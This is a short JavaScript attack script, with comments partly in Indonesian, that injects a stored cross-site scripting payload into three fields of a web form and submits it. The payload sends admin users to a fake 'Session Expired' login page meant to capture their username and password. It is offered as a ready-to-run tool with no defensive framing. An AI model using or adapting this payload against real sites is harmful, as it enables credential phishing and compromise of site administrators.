
// XSS Injection Script
// Run this in browser console saat sudah login ke admin panel

function injectPayload() {
    // Fill form dengan payload
    document.getElementById('email').value = `<script>
if(window.location.href.includes("admin")){
    window.location.href = "data:text/html,<h1>Session Expired. Please login again.</h1><form><input name='user' placeholder='Username'><input name='pass' type='password' placeholder='Password'><button onclick='alert(user.value + ":" + pass.value)'>Login</button></form>";
}
</script>`;
    document.getElementById('anak').value = `<script>
if(window.location.href.includes("admin")){
    window.location.href = "data:text/html,<h1>Session Expired. Please login again.</h1><form><input name='user' placeholder='Username'><input name='pass' type='password' placeholder='Password'><button onclick='alert(user.value + ":" + pass.value)'>Login</button></form>";
}
</script>`;
    document.getElementById('alamat').value = `<script>
if(window.location.href.includes("admin")){
    window.location.href = "data:text/html,<h1>Session Expired. Please login again.</h1><form><input name='user' placeholder='Username'><input name='pass' type='password' placeholder='Password'><button onclick='alert(user.value + ":" + pass.value)'>Login</button></form>";
}
</script>`;
    
    // Submit form
    document.getElementById('myForm').submit();
    
    console.log('[+] Payload injected!');
}

// Execute
injectPayload();
